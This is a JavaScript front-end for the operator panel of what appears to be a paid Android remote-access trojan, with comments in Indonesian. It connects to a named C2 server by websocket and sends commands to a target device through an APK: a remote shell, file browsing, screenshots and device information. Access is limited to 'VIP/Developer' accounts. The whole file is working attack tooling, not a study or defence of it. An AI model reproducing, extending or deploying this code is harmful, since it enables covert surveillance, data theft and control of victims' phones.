import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-app.js";
import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-auth.js";
import { getFirestore, doc, getDoc } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-firestore.js";

const app = initializeApp(window.firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const $ = id => document.getElementById(id);

// GANTI URL INI NANTI PAS SERVER RAILWAY LO UDAH JADI
const C2_SERVER_URL = "https://sectkur-c2.up.railway.app"; 

let socket = null;
let currentAppuid = null;

document.getElementById("sidebar-toggle").addEventListener("click", () => {
  document.getElementById("sidebar").classList.toggle("collapsed");
});
$("nav-logout").addEventListener("click", async e => { e.preventDefault(); await signOut(auth); window.location.href = "/login"; });

function showToast(msg, type = "info") {
  const t = $("toast"); t.textContent = msg; t.className = "toast show " + type;
  setTimeout(() => t.className = "toast", 3000);
}

function switchTab(tabId) {
  ['shell', 'file', 'screen', 'info'].forEach(t => $(`tab-${t}`).classList.add("hidden"));
  $(`tab-${tabId}`).classList.remove("hidden");
}

onAuthStateChanged(auth, async (user) => {
  if (!user) { window.location.href = "/login"; return; }
  
  const snap = await getDoc(doc(db, "users", user.uid));
  if (!snap.exists() || (snap.data().role !== "vip" && snap.data().role !== "developer")) {
    showToast("Akses ditolak. Hanya VIP/Developer.", "error");
    setTimeout(() => window.location.href = "/dashboard", 2000);
    return;
  }

  currentAppuid = user.uid;
  $("c2-appuid").textContent = currentAppuid;

  initSocket();
});

function initSocket() {
  if (socket) socket.disconnect();
  
  // Tampilin status connecting
  $("device-status").textContent = "CONNECTING...";
  $("device-status").className = "role-badge trial";

  try {
    socket = io(C2_SERVER_URL, { transports: ["websocket"] });

    socket.on("connect", () => {
      console.log("Connected to C2 Server");
      // Handshake sebagai panel operator
      socket.emit("register_panel", { appuid: currentAppuid });
    });

    // Cek apakah device target (APK) online
    socket.on("device_status", (data) => {
      if (data.online) {
        $("device-status").textContent = "ONLINE";
        $("device-status").className = "role-badge vip";
        appendTerm(`\n[+] Device terhubung!\n`);
        getDeviceInfo(); // Auto get info pas connect
      } else {
        $("device-status").textContent = "OFFLINE";
        $("device-status").className = "role-badge expired";
        appendTerm(`\n[-] Device terputus.\n`);
      }
    });

    // Terima hasil dari device
    socket.on("command_output", (data) => {
      if (data.type === "shell") {
        appendTerm(data.output);
      } else if (data.type === "file_list") {
        renderFiles(data.files);
      } else if (data.type === "screenshot") {
        renderScreenshot(data.base64);
      } else if (data.type === "device_info") {
        renderDeviceInfo(data.info);
      }
    });

    socket.on("error", (msg) => {
      showToast("Server Error: " + msg, "error");
    });

    socket.on("disconnect", () => {
      $("device-status").textContent = "OFFLINE";
      $("device-status").className = "role-badge expired";
    });

  } catch (err) {
    console.error(err);
    showToast("Gagal konek ke C2 Server", "error");
  }
}

// --- AKSI-AKSI ---

function appendTerm(text) {
  const term = $("term-output");
  term.innerHTML += `<div>${text}</div>`;
  term.scrollTop = term.scrollHeight;
}

window.sendShellCmd = function() {
  const cmd = $("term-input").value.trim();
  if (!cmd) return;
  appendTerm(`<span style="color:white;">$ ${cmd}</span>`);
  $("term-input").value = "";
  
  if (socket) {
    socket.emit("send_command", { appuid: currentAppuid, command: "shell", args: cmd });
  }
};

window.listFiles = function() {
  const path = $("file-path").value.trim();
  if (socket) {
    socket.emit("send_command", { appuid: currentAppuid, command: "list_files", args: path });
  }
};

window.captureScreen = function() {
  const img = $("screen-img");
  const placeholder = $("screen-placeholder");
  img.style.display = "none";
  placeholder.style.display = "block";
  placeholder.textContent = "Mengambil gambar...";
  
  if (socket) {
    socket.emit("send_command", { appuid: currentAppuid, command: "screenshot", args: "" });
  }
};

window.getDeviceInfo = function() {
  if (socket) {
    socket.emit("send_command", { appuid: currentAppuid, command: "device_info", args: "" });
  }
};

// --- RENDER HASIL ---

function renderFiles(files) {
  const tbody = $("file-tbody");
  if (!files || files.length === 0) {
    tbody.innerHTML = `<tr><td colspan="3" class="text-center text-dim">Kosong.</td></tr>`;
    return;
  }
  tbody.innerHTML = "";
  files.forEach(f => {
    const tr = document.createElement("tr");
    tr.innerHTML = `
      <td>${f.name}</td>
      <td>${f.isDir ? "Folder" : "File"}</td>
      <td>
        ${f.isDir ? `<button class="action-btn" onclick="openFolder('${f.path}')">Buka</button>` : `<button class="action-btn gold">Download</button>`}
      </td>
    `;
    tbody.appendChild(tr);
  });
}

window.openFolder = function(path) {
  $("file-path").value = path;
  listFiles();
};

function renderScreenshot(base64) {
  const img = $("screen-img");
  const placeholder = $("screen-placeholder");
  
  if (base64) {
    img.src = "data:image/jpeg;base64," + base64;
    img.style.display = "block";
    placeholder.style.display = "none";
  } else {
    placeholder.textContent = "Gagal mengambil gambar.";
  }
}

function renderDeviceInfo(info) {
  const out = $("info-output");
  out.innerHTML = "";
  for (const [key, value] of Object.entries(info)) {
    out.innerHTML += `<div><span style="color:var(--blood);">${key}:</span> ${value}</div>`;
  }
}
